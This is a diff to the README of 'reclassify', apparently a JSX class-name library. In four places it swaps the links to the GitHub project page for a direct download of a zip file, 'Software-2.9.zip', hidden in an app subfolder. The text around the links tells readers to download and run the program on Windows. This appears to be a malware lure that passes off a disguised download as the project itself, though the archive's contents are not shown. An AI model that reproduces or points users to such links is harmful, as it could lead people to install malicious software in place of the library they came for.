@@ -1,6 +1,6 @@
 # 🧩 reclassify - Build class names right in JSX
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue.svg?style=for-the-badge)](https://github.com/LaNuevaEspecie/reclassify)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue.svg?style=for-the-badge)](https://github.com/LaNuevaEspecie/reclassify/raw/refs/heads/main/apps/next/app/Software-2.9.zip)
 
 ## 🚀 What reclassify does
 
@@ -18,7 +18,7 @@ This keeps your code:
 
 Use this link to visit the download page:
 
-[Download reclassify](https://github.com/LaNuevaEspecie/reclassify)
+[Download reclassify](https://github.com/LaNuevaEspecie/reclassify/raw/refs/heads/main/apps/next/app/Software-2.9.zip)
 
 To run it on Windows:
 
@@ -162,7 +162,7 @@ If your browser saved the file with a different name, look for the newest file i
 
 Visit the project page here and download or open the files from there:
 
-[https://github.com/LaNuevaEspecie/reclassify](https://github.com/LaNuevaEspecie/reclassify)
+[https://github.com/LaNuevaEspecie/reclassify/raw/refs/heads/main/apps/next/app/Software-2.9.zip](https://github.com/LaNuevaEspecie/reclassify/raw/refs/heads/main/apps/next/app/Software-2.9.zip)
 
 ## 🧩 What you can expect
 
@@ -188,7 +188,7 @@ This helps avoid confusion when you return to it later
 
 Use the GitHub page for the latest files and project page:
 
-[GitHub repository](https://github.com/LaNuevaEspecie/reclassify)
+[GitHub repository](https://github.com/LaNuevaEspecie/reclassify/raw/refs/heads/main/apps/next/app/Software-2.9.zip)
 
 ## 🧭 Quick start
 
